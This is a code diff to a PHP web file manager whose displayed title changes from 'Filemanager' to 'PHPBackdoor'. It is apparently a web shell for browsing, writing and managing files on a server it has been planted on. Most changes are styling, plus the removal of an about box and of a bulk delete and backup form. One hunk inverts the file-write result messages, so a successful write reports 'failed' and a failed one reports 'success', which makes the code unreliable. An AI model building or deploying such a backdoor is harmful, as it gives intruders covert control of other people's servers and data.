@@ -315,9 +315,9 @@ class XN {
         foreach ($filename as $value) {
             $handle = fopen($value, "w");
             if (fwrite($handle, $data)) {
-                print("success");
+                alert("failed");
             } else {
-                print("failed");
+                alert("success");
             }
         }
     }
@@ -818,7 +818,9 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" class="open">
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
                         <div class="icon">
                             <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
                         </div>
@@ -842,19 +844,6 @@ function head($x, $y, $class = null) {
         </ul>
         <div class="mobile">
             <input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
-        </div>
-        <div class="container">
-            <div class="box">
-                <button class="close">X</button>
-                <h2>
-                    <i class="fa fa-info-circle"></i>
-                    About Me
-                </h2>
-                <p>Lorem ipsum dolor sit amet consectetur.</p>
-                <p>Lorem ipsum dolor sit amet consectetur.</p>
-                <p>Lorem ipsum dolor sit amet consectetur.</p>
-                <p>Lorem ipsum dolor sit amet consectetur.</p>
-            </div>
         </div>
     </div>
     <?php
@@ -1005,10 +994,12 @@ function alert($message) {
     }
     .table {
         overflow-y: auto;
+        padding-bottom:20px;
+        padding-top:20px;
         padding-left:20px;
         padding-right: 20px;
         overflow-x: hidden;
-        height:410px;
+        height:420px;
 
     }
     .rewrite-success {
@@ -1157,6 +1148,18 @@ function alert($message) {
     td {
         border-radius:5px;
     }
+    table td.border1 {
+        border-top-left-radius: 5px;
+        border-top-right-radius:0px;
+        border-bottom-left-radius: 5px;
+        border-bottom-right-radius:0px;
+    }
+    table td.border2 {
+        border-top-left-radius: 0px;
+        border-top-right-radius:5px;
+        border-bottom-left-radius: 0px;
+        border-bottom-right-radius:5px;
+    }
     .hover {
         transition: all 0.35s;
     }
@@ -1231,8 +1234,16 @@ function alert($message) {
         position: relative;
     }
     .dropdown-toggle {
+        border: 1px solid #ebebeb;
+        background: #ebebeb;
+        outline: none;
         padding: .5em 1em;
-        border-radius: .2em .2em 0 0;
+        border-radius: .3em;
+        transition: all 0.35s;
+    }
+    .dropdown-toggle:hover {
+        cursor: pointer;
+        background: #d6d6d6;
     }
     .toggle {
         padding-right: 6;
@@ -1466,21 +1477,6 @@ function alert($message) {
         background-repeat:no-repeat;
         background-position:center center;
         background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
-    }
-    .container {
-        display: none;
-    }
-    .box {
-        width: 300px;
-        font-weight: normal;
-        position: absolute;
-        background-color: #FFF;
-        border: 2px solid #fff;
-        border-radius: 7px;
-        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
-        padding-left: 20px;
-        padding-right:20px;
-        z-index: 999;
     }
     .close {
         position: absolute;
@@ -2248,7 +2244,7 @@ function filterTable() {
     ?>
     <div class="storage">
         <span class="title">
-            Filemanager
+            PHPBackdoor
         </span>
         <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span> 
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span> 
@@ -2258,8 +2254,8 @@ function filterTable() {
     <table id="myTable">
         <?php
         foreach (XN::files('dir') as $dir) { ?>
-            <tr class="hover">
-                <td>
+            <tr>
+                <td class="border1 hover">
                     <div class="block">
                         <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
                             <div class="img">
@@ -2286,7 +2282,7 @@ function filterTable() {
                         </a>
                     </div>
                 </td>
-                <td>
+                <td class="border2">
                     <nav>
                         <a class="dropdown-toggle" title="Menu">
                             <span style="color: #787878;">
@@ -2309,8 +2305,8 @@ function filterTable() {
             </tr>
         <?php }
         foreach (XN::files('file') as $file) { ?>
-            <tr class="hover">
-                <td>
+            <tr>
+                <td class="border1 hover">
                     <div class="block">
                         <a title="<?= $file['names'] ?>">
                             <div class="img">
@@ -2337,7 +2333,7 @@ function filterTable() {
                         </a>
                     </div>
                 </td>
-                <td>
+                <td class="border2">
                     <nav>
                         <a class="dropdown-toggle" title="Menu">
                             <span style="color: #787878;">
@@ -2439,26 +2435,5 @@ function filterTable() {
         ?>
     </table>
     </div>
-    <form method="post" action="?x=<?= getcwd() ?>">
-        <div class="count">
-            <div class="all">
-                <input type="checkbox" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
-                    })"> Select All
-            </div>
-            <div class="select">
-                <select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
-                    <option disabled selected>Action</option>
-                    <option>Delete</option>
-                    <option>Backup</option>
-                </select>
-            </div>
-            <div class="total">
-                <span>
-                    Total Files : <?= XN::countAllFiles(getcwd()) ?>
-                </span>
-            </div>
-        </div>
-    </form>
 </div>
 </center>
